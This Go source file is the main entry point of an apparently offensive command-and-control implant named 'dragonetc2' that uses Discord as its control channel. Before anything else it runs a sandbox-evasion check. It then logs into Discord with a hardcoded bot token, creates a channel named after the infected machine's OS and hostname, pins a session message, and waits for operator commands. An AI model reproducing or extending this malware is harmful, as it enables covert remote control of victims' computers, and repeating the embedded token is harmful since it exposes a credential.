package main

import (
	"dragonetc2/pkg/handlers"
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

func main() {
	if handlers.RunSandboxEvasion() {
		fmt.Println("Evasion successful!")
		runBot()
	}
}

func runBot() {
	// Get token and channel ID from environment variables
	token := "MTI2Njc4MzIxNzQ5MTM4MjMwMw.GDWbQ9.PRfg-mM5mk-uup-Sw_VNrzDKbKQsxcSBTwCkZU"
	handlers.MyChannelId = "1266783026898272369"

	// Create a new Discord session
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error creating Discord session,", err)
		return
	}

	// Register the message handler
	dg.AddHandler(handlers.Handler)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	// Register the slash command handler
	dg.AddHandler(handlers.InteractionHandler)

	// Open a websocket connection to Discord
	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening connection,", err)
		return
	}

	// Register slash commands
	handlers.RegisterSlashCommands(dg)

	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting current user:", err)
		return
	}
	sessionId := fmt.Sprintf("%s_%s", runtime.GOOS, hostname)
	c, err := dg.GuildChannelCreate(handlers.MyChannelId, sessionId, 0) // Replace with your guild ID
	if err != nil {
		fmt.Println("Error creating channel:", err)
		return
	}
	handlers.MyChannelId = c.ID

	// Send the embed message and pin it
	err = handlers.SendAndPinEmbedMessage(dg, handlers.MyChannelId, sessionId, hostname)
	if err != nil {
		fmt.Println("Error sending and pinning embed message:", err)
		return
	}

	// Wait for interrupt signal to gracefully close
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	// Close the Discord session
	dg.Close()
}
